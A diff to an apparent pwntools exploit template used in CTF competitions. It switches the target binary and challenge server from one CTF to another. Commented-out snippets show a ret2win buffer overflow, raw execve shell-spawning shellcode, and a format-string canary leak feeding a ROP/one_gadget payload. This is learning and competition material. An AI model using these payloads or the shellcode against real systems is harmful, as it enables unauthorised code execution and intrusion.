@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-elf = context.binary = ELF('./noob/noobpwn2', checksec=True)
+elf = context.binary = ELF('./TFC/notes', checksec=True)
 
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
 # context.log_level = 'debug'
@@ -17,8 +17,8 @@ context.terminal = ['tmux', 'splitw', '-h']
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or 'challs.n00bzunit3d.xyz'
-port = int(args.PORT or 35932)
+host = args.HOST or 'challs.tfcctf.com'
+port = int(args.PORT or 30682)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -45,7 +45,7 @@ def start(argv=[], *a, **kw):
 def find_ip(payload):
     # Launch process and send payload
     p = process(elf.path, level='warn')
-    p.sendlineafter(b'?', payload)
+    p.sendline(payload)
     # Wait for the prcoess to crash
     p.wait()
     # Print out the address of EIP/RIP at the time of crashing
@@ -66,14 +66,13 @@ continue
 #                    EXPLOIT GOES HERE
 #===========================================================
 
-io = start()
-
 #ret2win
-# offset = find_ip(cyclic(128))
+# offset = find_ip(cyclic(300))
 # payload = flat(
 #     b'A' * offset,
 #     elf.symbols.win
 # )
+# io.sendline(payload)
 
 #ret2shellcode
 # shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
@@ -142,8 +141,7 @@ io = start()
 
 #frmt str buffer overflow
 # payload = f'%21$p.%23$p.%25$p'.encode()
-# payload = cyclic(136) + pack(canary) + pack(0) + pack(libc_base + rop_gadget)
-
+# payload = cyclic(136) + pack(canary) + pack(0) + pack(libc_base + one_gadget)
 
 
 # #Example
